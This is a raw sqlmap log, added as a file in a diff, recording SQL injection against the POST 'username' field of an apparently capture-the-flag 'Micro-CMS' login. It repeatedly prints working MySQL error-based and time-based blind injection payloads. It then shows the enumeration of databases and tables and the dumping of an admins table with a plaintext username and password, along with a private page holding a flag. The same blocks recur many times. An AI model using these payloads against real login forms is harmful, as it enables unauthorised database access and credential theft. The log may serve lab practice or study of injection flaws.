@@ -1,0 +1,400 @@
+sqlmap identified the following injection point(s) with a total of 65 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+available databases [4]:
+[*] information_schema
+[*] level2
+[*] mysql
+[*] performance_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+Database: level2
+[2 tables]
++--------+
+| admins |
+| pages  |
++--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+Database: level2
+Table: admins
+[1 entry]
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | august   | marcie   |
++----+----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+Database: level2
+Table: pages
+[3 entries]
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+| id | body                                                                                                                                                                                                                                                                                                                           | title               | public |
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+| 1  | ## Version 2\\nThis version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20.  By default, users need to be an admin to add or edit pages now.\\n | Micro-CMS Changelog | 1      |
+| 2  | Just testing some markdown functionality.\\n\\n![adorable kitten](https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/)\\n\\n<button>Some button</button>                                                                                                                 | Markdown Test       | 1      |
+| 3  | My secret is ^FLAG^0ebd6a36a0c1649f8a89e33bc9f5ea05a7b97bada43e01dd602f29f6529b9950$FLAG$                                                                                                                                                                                                                                      | Private Page        | 0      |
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+available databases [4]:
+[*] information_schema
+[*] level2
+[*] mysql
+[*] performance_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+Database: level2
+Table: pages
+[3 entries]
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+| id | body                                                                                                                                                                                                                                                                                                                           | title               | public |
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+| 1  | ## Version 2\\nThis version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20.  By default, users need to be an admin to add or edit pages now.\\n | Micro-CMS Changelog | 1      |
+| 2  | Just testing some markdown functionality.\\n\\n![adorable kitten](https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/)\\n\\n<button>Some button</button>                                                                                                                 | Markdown Test       | 1      |
+| 3  | My secret is ^FLAG^0ebd6a36a0c1649f8a89e33bc9f5ea05a7b97bada43e01dd602f29f6529b9950$FLAG$                                                                                                                                                                                                                                      | Private Page        | 0      |
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+available databases [4]:
+[*] information_schema
+[*] level2
+[*] mysql
+[*] performance_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+available databases [4]:
+[*] information_schema
+[*] level2
+[*] mysql
+[*] performance_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+available databases [4]:
+[*] information_schema
+[*] level2
+[*] mysql
+[*] performance_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+Database: level2
+[2 tables]
++--------+
+| admins |
+| pages  |
++--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+Database: level2
+[2 tables]
++--------+
+| admins |
+| pages  |
++--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+Database: mysql
+[26 tables]
++-----------------------+
+| column_stats          |
+| columns_priv          |
+| db                    |
+| event                 |
+| func                  |
+| general_log           |
+| gtid_slave_pos        |
+| help_category         |
+| help_keyword          |
+| help_relation         |
+| help_topic            |
+| host                  |
+| index_stats           |
+| innodb_index_stats    |
+| innodb_table_stats    |
+| plugin                |
+| proc                  |
+| procs_priv            |
+| proxies_priv          |
+| roles_mapping         |
+| servers               |
+| slow_log              |
+| table_stats           |
+| tables_priv           |
+| time_zone             |
+| time_zone_leap_second |
++-----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+Database: level2
+[2 tables]
++--------+
+| admins |
+| pages  |
++--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+Database: level2
+Table: admins
+[1 entry]
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | august   | marcie   |
++----+----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+Database: level2
+Table: pages
+[3 entries]
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+| id | body                                                                                                                                                                                                                                                                                                                           | title               | public |
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+| 1  | ## Version 2\\nThis version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20.  By default, users need to be an admin to add or edit pages now.\\n | Micro-CMS Changelog | 1      |
+| 2  | Just testing some markdown functionality.\\n\\n![adorable kitten](https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/)\\n\\n<button>Some button</button>                                                                                                                 | Markdown Test       | 1      |
+| 3  | My secret is ^FLAG^0ebd6a36a0c1649f8a89e33bc9f5ea05a7b97bada43e01dd602f29f6529b9950$FLAG$                                                                                                                                                                                                                                      | Private Page        | 0      |
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+Database: level2
+Table: pages
+[3 entries]
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+| id | body                                                                                                                                                                                                                                                                                                                           | title               | public |
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+| 1  | ## Version 2\\nThis version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20.  By default, users need to be an admin to add or edit pages now.\\n | Micro-CMS Changelog | 1      |
+| 2  | Just testing some markdown functionality.\\n\\n![adorable kitten](https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/)\\n\\n<button>Some button</button>                                                                                                                 | Markdown Test       | 1      |
+| 3  | My secret is ^FLAG^0ebd6a36a0c1649f8a89e33bc9f5ea05a7b97bada43e01dd602f29f6529b9950$FLAG$                                                                                                                                                                                                                                      | Private Page        | 0      |
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=ss' AND (SELECT 1031 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(1031=1031,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'EgEY'='EgEY&password=ss
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=ss' AND (SELECT 1132 FROM (SELECT(SLEEP(5)))WEnQ) AND 'UWib'='UWib&password=ss
+---
+back-end DBMS: MySQL >= 5.0
+Database: level2
+Table: admins
+[1 entry]
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | august   | marcie   |
++----+----------+----------+
+
